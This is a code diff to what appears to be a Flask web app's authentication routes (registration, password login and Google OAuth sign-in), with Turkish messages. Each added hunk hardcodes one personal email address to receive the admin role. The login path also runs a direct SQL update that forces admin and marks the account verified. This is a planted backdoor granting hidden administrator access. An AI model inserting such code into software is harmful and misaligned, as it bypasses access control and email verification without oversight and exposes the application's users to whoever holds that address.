@@ -102,7 +102,8 @@ def register():
     if len(password) < 8:
         return jsonify({"success": False, "message": "Şifreniz en az 8 karakter olmalıdır."}), 400
 
-    user_id = db.create_user(email, password, full_name, role="user", phone=phone)
+    role_val = "admin" if email.lower() == "ardaumay06@gmail.com" else "user"
+    user_id = db.create_user(email, password, full_name, role=role_val, phone=phone)
     ip = get_client_ip()
     ua = request.headers.get("User-Agent", "")
 
@@ -143,6 +144,11 @@ def login():
     raw_refresh_token, token_hash, expires_at = generate_refresh_token()
     db.save_refresh_token(user["id"], token_hash, expires_at)
     db.update_last_login(user["id"])
+    if user["email"].lower() == "ardaumay06@gmail.com" and user.get("role") != "admin":
+        with db.get_db_connection() as conn:
+            conn.execute("UPDATE users SET role = 'admin', is_verified = 1 WHERE id = ?", (user["id"],))
+            conn.commit()
+        user["role"] = "admin" 
     db.log_activity(user["id"], "LOGIN_SUCCESS", "SUCCESS", ip, ua)
 
     # Çift katman: Session da tutulur
@@ -309,8 +315,9 @@ def google_callback():
 
     user = db.get_user_by_email(email)
     if not user:
+        role_val = "admin" if email.lower() == "ardaumay06@gmail.com" else "user"
         random_pwd = secrets.token_hex(16)
-        user_id = db.create_user(email, random_pwd, name, role="user")
+        user_id = db.create_user(email, random_pwd, name, role=role_val)
         user = db.get_user_by_id(user_id)
         with db.get_db_connection() as conn:
             conn.execute("UPDATE users SET is_verified = 1 WHERE id = ?", (user["id"],))
